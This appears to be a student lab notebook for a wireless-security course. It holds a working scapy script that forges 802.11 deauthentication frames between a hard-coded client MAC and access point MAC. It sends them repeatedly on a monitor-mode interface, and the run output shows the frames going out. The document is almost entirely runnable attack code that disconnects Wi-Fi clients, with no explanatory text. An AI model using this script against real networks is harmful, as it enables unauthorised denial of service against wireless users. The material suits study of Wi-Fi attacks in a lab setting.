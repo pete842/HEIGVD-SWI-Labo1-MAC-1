{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "from scapy.all import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Reason (1, 4, 5 or 8): 1\n"
     ]
    }
   ],
   "source": [
    "target = \"f4:0f:24:3b:9f:ee\"\n",
    "ap = \"dc:a5:f4:60:c5:af\"\n",
    "reason = int(input(\"Reason (1, 4, 5 or 8): \"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "if reason == 1:\n",
    "    packets = [RadioTap() / Dot11(type=0, subtype=12, addr1=target, addr2=ap, addr3=ap) / Dot11Deauth(reason=reason),RadioTap() / Dot11(type=0, subtype=12, addr1=ap, addr2=target, addr3=target) / Dot11Deauth(reason=int(reason))]\n",
    "elif reason == 4 or reason == 5:\n",
    "        packets = RadioTap() / Dot11(type=0, subtype=12, addr1=target, addr2=ap, addr3=ap) / Dot11Deauth(reason=reason)\n",
    "elif reason == 8:\n",
    "        packets = RadioTap() / Dot11(type=0, subtype=12, addr1=ap, addr2=target, addr3=target) / Dot11Deauth(reason=reason)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Sent 2 packets.\n",
      "\n",
      "Sent 2 packets.\n",
      "\n",
      "Sent 2 packets.\n",
      "\n",
      "Sent 2 packets.\n",
      "\n",
      "Sent 2 packets.\n",
      "\n",
      "Sent 2 packets.\n",
      "\n",
      "Sent 2 packets.\n",
      "\n",
      "Sent 2 packets.\n",
      "\n",
      "Sent 2 packets.\n",
      "\n",
      "Sent 2 packets.\n"
     ]
    }
   ],
   "source": [
    "for i in range(10):\n",
    "    sendp(packets, iface=\"wlp3s0mon\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
